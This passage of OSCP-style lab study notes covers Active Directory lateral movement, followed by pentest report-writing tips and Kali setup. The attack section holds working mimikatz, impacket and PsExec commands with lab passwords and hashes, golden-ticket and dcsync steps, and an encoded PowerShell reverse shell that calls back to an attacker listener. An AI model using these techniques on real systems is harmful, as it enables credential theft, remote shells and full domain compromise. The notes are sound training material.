    ```
- PsExec  
  - **offsec(admin)**:client74 --> web04  
    `xfreerdp3 /u:offsec /p:lab /v:192.168.158.74 /cert:ignore /drive:share,/home/kali/share` (avoid using (d) for RDP as the user has local admin)  
  - Using PsExec laterally move to another host (web04) and open a remote cmd.exe  
    `PS C:\Tools\SysinternalsSuite> .\PsExec64.exe -i  \\web04 -u corp\jen -p Nexus123! cmd`  
- Pass the Hash
  - **Administrator** move laterally to web04 from kali (stolen hash)  
    `kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.127.72`  
- Overpass the Hash
  - **jeff**:client76 --> web04  
    `xfreerdp3 /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.127.76 /cert:ignore /drive:share,/home/kali/share`  
  - run a process as **jen:Nexus123!** (Shift right click run as different user)  
  - dump logon password  
    `C:\tools>.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit > samdump.txt`
  - Connect to CLIENT76 as **'offsec' (admin)**
    `xfreerdp3 /u:offsec /p:lab /v:192.168.127.76 /cert:ignore /drive:share,/home/kali/share`  
  - Inject NTLM hash (**jen**) into a fake logon session (OverPass-the-Hash)  
    `C:\tools>.\mimikatz.exe "sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell" exit`  
  - Map network resource access web04  
    `PS C:\Windows\system32> net use \\web04`
  - Check Kerberos tickets
    `PS C:\Windows\system32> klist`  
  - Using PsExec to access web04
    `PS C:\tools\SysinternalsSuite> .\PsExec.exe \\web04 cmd`  
- Pass the ticekts
  - **jen**:client76 --> web04  
    `xfreerdp3 /u:jen /d:corp.com /p:Nexus123! /v:192.168.127.76 /cert:ignore /drive:share,/home/kali/share`
  - exporting Kerberos tickets  
    `C:\tools>.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit`  
  - listing all Kerberos ticket files  
    `PS C:\Tools> dir *.kirbi`  
  - injecting a Kerberos ticket into your current session to authenticate as the user in the ticket without needing a password  
    `mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi`
  - `PS C:\Tools> type ls \\web04\backup\flag.txt`
- DCOM
  - **jen**:client74 --> web04  
    `xfreerdp3 /u:jen /d:corp.com /p:Nexus123! /v:192.168.127.74 /cert:ignore /drive:share,/home/kali/share`
  - Create a remote COM object on the target web04 From an elevated PowerShell prompt
    `$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.127.72"))`  
  - Execute a command (calc.exe) via the remote COM object (Demonstrates that code execution is possible on the remote host via the DCOM object)  
    `$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")`
  - Execute a PowerShell payload (encoded). Spawn a reverse shell back to your Kali listener (nc -lnvp 443)
    ```
    $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgAzACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=","7")
    ```
  - remote shell on the target machine connect back to Kali
    `kali@kali:~$ nc -lnvp 443`  
- Golden ticket
  - access to DC1  
  - RDP to DC1 as **jeffadmin**  
    `xfreerdp3 /u:jeffadmin /d:corp.com /p:BrouhahaTungPerorateBroom2023! /v:192.168.127.70 /cert:ignore /drive:share,/home/kali/share`  
  - Obtain the krbtgt NTLM hash
    ```
    mimikatz # privilege::debug
    mimikatz # lsadump::lsa /patch
    ```
  - Move back to client74 as **jen**    
    `xfreerdp3 /u:jen /d:corp.com /p:Nexus123! /v:192.168.127.74 /cert:ignore /drive:share,/home/kali/share`  
  - Purge existing Kerberos tickets    
    `mimikatz # kerberos::purge`
  - Create a forged TGT (Golden Ticket)  
    `mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt`  
  - Access resources across the domain (Golden Tickets don’t expire until krbtgt password is reset)  
    `C:\Tools\SysinternalsSuite>.\PsExec.exe \\dc1 cmd.exe`  
- dcsync to DC1
  - RDP to DC1 as jeffadmin  
    `xfreerdp3 /u:jeffadmin /d:corp.com /p:BrouhahaTungPerorateBroom2023! /v:192.168.127.70 /cert:ignore /drive:share,/home/kali/share`  
  - perform a dcsync attack to obtain the credentials of Administrator  
    `mimikatz # lsadump::dcsync /user:corp\Administrator`  
  - Crack the NTLM hash  
    `kali@kali:~$ hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
  - gain access to DC1 from the cracked credential  
    `rdesktop -u Administrator  -p lab -d corp.com -g 1280x860 -r disk:share=/home/kali/share 192.168.127.70`  

## Penetration testing report 
- note editor:
  - [Sublime-syntax highlight](https://www.sublimetext.com/download)
  - [CherryTree Kali](https://github.com/giuspen/cherrytree)
  - [Obsidian-markdown editor](https://obsidian.md/)
- taking screenshots:
  - snipping tool （win:win+shift+S. Linux:shift+print screen)
  - [flameshot](https://github.com/flameshot-org/flameshot)
- penetration testing notes: application name, URL, request type, issue detail, proof of concept payload  
- effective penetration testing report
  - purpose: highlights all the present flaws, remediation, scope
  - tailor for audience:  
    - **c-suite**: scope + timeframeout, rules of engagement + methodology + executive summary (impact/work-case scenario, trends, strategic advise)  
     **--engagement**    
     The Client hired OffSec to conduct a penetration test of their kali.org web application in October of 2025. The test was conducted from a remote IP between the hours of 9 AM and 5 PM, with no users provided by the Client."  
     **--positives**    
     The application had many forms of hardening in place. First, OffSec was unable toupload malicious files due to the strong filteringin place. OffSec was also unable to brute force user accountsbecause of the robust lockout policy in place. Finally, the strongpassword policy made trivial password attacks unlikely to succeed.This points to a commendable culture of user account protections    
     **--vulnerabilities**    
     However, there were still areas of concern within the application.OffSec was able to inject arbitrary JavaScript into the browser ofan unwitting victim that would then be run in the context of thatvictim. In conjunction with the username enumeration on the loginfield, there seems to be a trend of unsanitized user input compoundedby verbose error messages being returned to the user. This can leadto some impactful issues, such as password or session stealing. It isrecommended that all input and error messages that are returned to theuser be sanitized and made generic to prevent this class of issue fromcropping up.  
     **--conclusion**    
     These vulnerabilities and their remediations are described in moredetail below. Should any questions arise, OffSec is happyto provide further advice and remediation help
    - **technical staff/summary**: technical detail + impact + remediation    
      - User and Privilege Management
      - Architecture
      - Authorization
      - Patch Management
      - Integrity and Signatures
      - Authentication
      - Access Control
      - Audit, Log Management and Monitoring
      - Traffic and Data Encryption
      - Security Misconfigurations
       
     Patch Management  
     Windows and Ubuntu operating systems that are not up to date wereidentified. These are shown to be vulnerable to publicly-availableexploits and could result in malicious execution of code, theftof sensitive information, or cause denial of services which        mayimpact the infrastructure. Using outdated applications increases thepossibility of an intruder gaining unauthorized access by exploitingknown vulnerabilities. Patch management ought to be improved andupdates should be applied in conjunction with change      management.
    - **technical findings and recommendation** (what vulnerability is + why dangerous + outcome + steps to exploit)  

      <img src="https://github.com/xasyhack/oscp2025/blob/main/images/Table%202%20-%20Findings%20and%20Recommendations.png" alt="Alt text" width="400"/>
      
      affected URL/endpoint + method of triggering the vulnerability  
    - **appendices**: articles, reference



## Kali setup
1. Register [Broadcom account](https://profile.broadcom.com/web/registration)
1. Download "VMware Workstation Pro"
1. Download [Kali VM](https://help.offsec.com/hc/en-us/articles/360049796792-Kali-Linux-Virtual-Machine)
1. Launching the VM (browse the .vmx file)
1. Login kali (🔒 username:kali, password:kali)
1. Kali terminal `sudo updatedb`
1. Download VPNs from OffSec portal (Explorer > VPN)
1. Connect to PWK Lab
   - `locate universal.ovpn`
   - `cd /home/kali/Downloads`
   - `mkdir /home/kali/offsec`
   - `mv universal.ovpn /home/kali/offsec/universal.ovpn`
   - `cd ../offsec`
   - `sudo openvpn universal.ovpn`
   - output reads "Initialization Sequence Completed"
   - disconnect VPN by pressing Ctrl+C
1. Package install
   - `sudo apt update`
   - `sudo apt install golang`
 1. Recommended software
    - Notetaking: [notion.so](http://notion.so)  or Obsidian
    - Scanning tool: [Rustscan](https://github.com/RustScan/RustScan/releases)  
      `dpkg -i rustscan_2.3.0_amd64.deb`
    - file upload/transfer purpose: Updog    
      ```  
      pip3 install updog  
      export PATH="/home/kali/.local/bin:$PATH"
      ```
    - Privilege Escalation: peass  
      `sudo apt install peass`
    - DNS: Gobuster  
      `sudo apt install gobuster`
    - Hosting a WebDAV share (for exploits, exfil, or testing): WsgiDAV  
      `sudo apt install wsgidav`
    - Lateral movement / privilege escalation: Bloodhound  
      `sudo apt update && sudo apt install -y bloodhound`
    - Stores AD data for querying & analysis: Neo4j  
      `sudo neo4j console`
    - Mimmikatz
      ```
      find ~/ -iname "mimikatz.exe"  
      ```

    ## Kali useful command
    - clean terminal history command: `bash` `history -c`
    - search history: history | grep dnf
